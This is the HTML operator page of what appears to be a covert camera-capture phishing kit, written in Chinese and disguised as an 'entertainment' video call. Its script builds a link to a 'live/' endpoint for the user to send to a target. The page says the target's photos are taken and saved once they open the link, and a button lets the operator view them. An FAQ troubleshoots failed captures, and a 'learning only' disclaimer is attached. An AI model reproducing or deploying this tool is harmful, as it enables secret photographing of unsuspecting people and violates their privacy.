<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>视频通话（娱乐）</title>
</head>
  <BODY>
   <script>
function  create() {
    var input = document.getElementById('content');
    var kd = document.getElementById('kd');
    var myid = document.getElementById('myid');
    if (myid.value==""){
        alert("ID或跳转地址不能为空！");
        return false;
    }
    var url = document.URL;
    var arrUrl = url.split("//");
    var start = arrUrl[1].indexOf("/");
    var relUrl = arrUrl[1].substring(start);
    var surl = url.replace(relUrl,"/");
    kd.href = surl + 'live/?qq=2891404183&id='+myid.value+'&_wv=16777223#alert%2891404183'; 
    kd.style = ''; 
    kd.innerText = surl + '?id='+myid.value; 
}
   </script>
   <p>1.本工具仅做学习交流使用，请勿用于非法用途！后果自负！</p>
   <p>2.源码下载：http://bbs.lxh5068.com/wzyuanma/3716.html</p>
   <p>输入ID：<input type= "text" id="myid"  value= ''/></p>
   <p><input type= "button"  value= '生成链接'  onclick= 'create();'  /> <input type="button" value='查看照片' onclick=window.location.href='tp.php?id='+document.getElementById('myid').value> </p>
   <p>将以下链接地址发送给你要拍摄的对象，对方进入后将会拍摄照片并保存</p>
   <p><a id="kd" style="pointer-events: none;">请先生成链接！</a></p>
   <p>问题一：为什么拍摄的是黑屏？答：因为该浏览器不支持，更换浏览器即可，安卓用户建议直接在QQ内打开链接</p>
   <p>问题二：拍摄的照片不全？答：还没等跳转完成就关闭了页面，数据还没传输完成</p>
  </BODY>
</HTML>
